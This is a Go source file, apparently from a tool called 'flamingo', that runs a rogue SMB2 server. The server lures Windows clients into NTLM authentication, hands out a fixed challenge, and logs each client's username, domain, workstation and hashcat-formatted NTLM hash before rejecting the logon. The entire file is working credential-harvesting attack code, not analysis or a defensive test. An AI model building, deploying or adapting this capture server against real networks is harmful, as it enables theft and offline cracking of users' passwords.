package flamingo

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/audibleblink/go-ntlm/ntlm"
)

type ConfSMB struct {
	BindHost     string
	BindPort     uint16
	RecordWriter *RecordWriter
	listener     net.Listener
}

func NewConfSMB() *ConfSMB {
	return &ConfSMB{
		BindHost: "0.0.0.0",
		BindPort: 445,
	}
}

func (c *ConfSMB) Shutdown() {
	if c.listener != nil {
		_ = c.listener.Close()
	}
}

func SpawnSMB(conf *ConfSMB) error {
	addr := fmt.Sprintf("%s:%d", conf.BindHost, conf.BindPort)
	l, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	conf.listener = l

	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				return
			}
			go handleSMBConn(conn, conf)
		}
	}()

	return nil
}

func readNetBIOSPacket(r io.Reader) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(r, header); err != nil {
		return nil, err
	}
	// NetBIOS Session message: byte 0 is 0x00, followed by 3-byte big-endian length
	length := int(header[1])<<16 | int(header[2])<<8 | int(header[3])
	if length > 65536 || length < 4 {
		return nil, fmt.Errorf("invalid NetBIOS packet length: %d", length)
	}

	payload := make([]byte, length)
	if _, err := io.ReadFull(r, payload); err != nil {
		return nil, err
	}
	return payload, nil
}

func writeNetBIOSPacket(w io.Writer, payload []byte) error {
	length := len(payload)
	header := []byte{
		0x00,
		byte((length >> 16) & 0xff),
		byte((length >> 8) & 0xff),
		byte(length & 0xff),
	}
	if _, err := w.Write(header); err != nil {
		return err
	}
	_, err := w.Write(payload)
	return err
}

func handleSMBConn(conn net.Conn, conf *ConfSMB) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(20 * time.Second))

	var sessionID uint64 = 0x1000

	for {
		packet, err := readNetBIOSPacket(conn)
		if err != nil || len(packet) < 64 {
			return
		}

		// Verify SMB2 magic (\xfeSMB)
		if packet[0] != 0xfe || packet[1] != 'S' || packet[2] != 'M' || packet[3] != 'B' {
			return
		}

		command := binary.LittleEndian.Uint16(packet[12:14])
		msgID := binary.LittleEndian.Uint64(packet[24:32])

		switch command {
		case 0x0000: // SMB2_NEGOTIATE
			resp := buildSMB2NegotiateResponse(msgID)
			if err := writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0001: // SMB2_SESSION_SETUP
			// Locate NTLMSSP message in security buffer
			idx := bytes.Index(packet, []byte("NTLMSSP\x00"))
			if idx == -1 {
				// No NTLM found, return logon failure
				resp := buildSMB2Header(0xc000006d, 0x0001, msgID, sessionID)
				_ = writeNetBIOSPacket(conn, resp)
				return
			}

			ntlmData := packet[idx:]
			if len(ntlmData) < 12 {
				return
			}
			msgType := binary.LittleEndian.Uint32(ntlmData[8:12])

			if msgType == 1 { // NTLMSSP_NEGOTIATE (Type 1)
				// Send NTLMSSP_CHALLENGE (Type 2) with fixed challenge
				challengeBlob := buildNTLMChallengeBlob()
				resp := buildSMB2SessionSetupType2Response(msgID, sessionID, challengeBlob)
				if err := writeNetBIOSPacket(conn, resp); err != nil {
					return
				}
			} else if msgType == 3 { // NTLMSSP_AUTHENTICATE (Type 3)
				authMsg, hashType, err := parseNTLMAuthSafely(ntlmData)
				if err == nil && authMsg != nil {
					hashcatStr := ntlmToHashcat(authMsg, hashType)
					user := authMsg.UserName.String()
					domain := authMsg.DomainName.String()
					ws := authMsg.Workstation.String()

					rec := map[string]string{
						"username":    user,
						"domain":      domain,
						"workstation": ws,
						"hashcat":     hashcatStr,
						"method":      "NTLMSSP",
					}
					if conf.RecordWriter != nil {
						conf.RecordWriter.Record("credential", "smb", conn.RemoteAddr().String(), rec)
					}
				}

				// Return STATUS_LOGON_FAILURE (0xc000006d)
				resp := buildSMB2Header(0xc000006d, 0x0001, msgID, sessionID)
				// Session setup failure body
				body := []byte{0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
				_ = writeNetBIOSPacket(conn, append(resp, body...))
				return
			} else {
				return
			}

		default:
			// Unsupported command, reply with failure
			resp := buildSMB2Header(0xc0000002, command, msgID, sessionID)
			_ = writeNetBIOSPacket(conn, resp)
			return
		}
	}
}

func buildSMB2Header(status uint32, command uint16, msgID uint64, sessionID uint64) []byte {
	buf := make([]byte, 64)
	copy(buf[0:4], []byte{0xfe, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(buf[4:6], 64) // StructureSize
	binary.LittleEndian.PutUint16(buf[6:8], 1)  // CreditCharge
	binary.LittleEndian.PutUint32(buf[8:12], status)
	binary.LittleEndian.PutUint16(buf[12:14], command)
	binary.LittleEndian.PutUint16(buf[14:16], 1)          // CreditResponse
	binary.LittleEndian.PutUint32(buf[16:20], 0x00000001) // Flags: SMB2_FLAGS_SERVER_TO_REDIR
	binary.LittleEndian.PutUint64(buf[24:32], msgID)
	binary.LittleEndian.PutUint64(buf[40:48], sessionID)
	return buf
}

func buildSMB2NegotiateResponse(msgID uint64) []byte {
	hdr := buildSMB2Header(0x00000000, 0x0000, msgID, 0)

	// NegTokenInit SPNEGO blob with NTLMSSP
	spnegoBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02,
		0xa0, 0x3e, 0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a,
		0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, // NTLMSSP OID
		0xa2, 0x2a, 0x04, 0x28,
		'N', 'T', 'L', 'M', 'S', 'S', 'P', 0x00,
		0x02, 0x00, 0x00, 0x00, // Type 2
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x02, 0x82, 0x05, // Flags
		0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, // Fixed Challenge
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}

	body := make([]byte, 64)
	binary.LittleEndian.PutUint16(body[0:2], 65)     // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 0x01)   // SecurityMode: signing enabled
	binary.LittleEndian.PutUint16(body[4:6], 0x0202) // DialectRevision: SMB 2.0.2
	// ServerGUID
	copy(body[8:24], []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10})
	binary.LittleEndian.PutUint32(body[24:28], 0x01) // Capabilities: DFS
	binary.LittleEndian.PutUint32(body[28:32], 65536)
	binary.LittleEndian.PutUint32(body[32:36], 65536)
	binary.LittleEndian.PutUint32(body[36:40], 65536)

	// SecurityBufferOffset (64 header + 64 body = 128)
	binary.LittleEndian.PutUint16(body[56:58], 128)
	binary.LittleEndian.PutUint16(body[58:60], uint16(len(spnegoBlob)))

	var res bytes.Buffer
	res.Write(hdr)
	res.Write(body)
	res.Write(spnegoBlob)
	return res.Bytes()
}

func buildNTLMChallengeBlob() []byte {
	// NTLM Challenge Message (Type 2)
	targetName := []byte("WORKGROUP")
	var ntlm bytes.Buffer
	ntlm.WriteString("NTLMSSP\x00")
	_ = binary.Write(&ntlm, binary.LittleEndian, uint32(2)) // MessageType 2

	// TargetNameFields: Len, MaxLen, Offset
	targetOffset := uint32(56)
	_ = binary.Write(&ntlm, binary.LittleEndian, uint16(len(targetName)))
	_ = binary.Write(&ntlm, binary.LittleEndian, uint16(len(targetName)))
	_ = binary.Write(&ntlm, binary.LittleEndian, targetOffset)

	// NegotiateFlags
	_ = binary.Write(&ntlm, binary.LittleEndian, uint32(0x00028205))

	// Server Challenge: 0x1122334455667788
	ntlm.Write([]byte{0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88})

	// Reserved 8 bytes
	ntlm.Write(make([]byte, 8))

	// TargetInfoFields (empty for simplicity)
	ntlm.Write(make([]byte, 8))

	// TargetName
	ntlm.Write(targetName)

	rawNTLM := ntlm.Bytes()

	// Wrap in SPNEGO NegTokenResp
	var spnego bytes.Buffer
	spnego.WriteByte(0xa1) // NegTokenResp tag
	spnego.WriteByte(byte(len(rawNTLM) + 7))
	spnego.Write([]byte{0x30, byte(len(rawNTLM) + 5), 0xa2, byte(len(rawNTLM) + 3), 0x04, byte(len(rawNTLM))})
	spnego.Write(rawNTLM)

	return spnego.Bytes()
}

func buildSMB2SessionSetupType2Response(msgID uint64, sessionID uint64, secBlob []byte) []byte {
	// Status: STATUS_MORE_PROCESSING_REQUIRED (0xc0000016)
	hdr := buildSMB2Header(0xc0000016, 0x0001, msgID, sessionID)

	body := make([]byte, 8)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	// SecurityBufferOffset (64 header + 8 body = 72)
	binary.LittleEndian.PutUint16(body[2:4], 72)
	binary.LittleEndian.PutUint16(body[4:6], uint16(len(secBlob)))

	var res bytes.Buffer
	res.Write(hdr)
	res.Write(body)
	res.Write(secBlob)
	return res.Bytes()
}

func parseNTLMAuthSafely(ntlmData []byte) (authMsg *ntlm.AuthenticateMessage, hashType int, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("recovered from ntlm parser: %v", r)
		}
	}()

	hashType = 2
	if len(ntlmData) >= 22 {
		ntLen := binary.LittleEndian.Uint16(ntlmData[20:22])
		if ntLen == 24 {
			hashType = 1
		}
	}
	authMsg, err = ntlm.ParseAuthenticateMessage(ntlmData, hashType)
	return authMsg, hashType, err
}
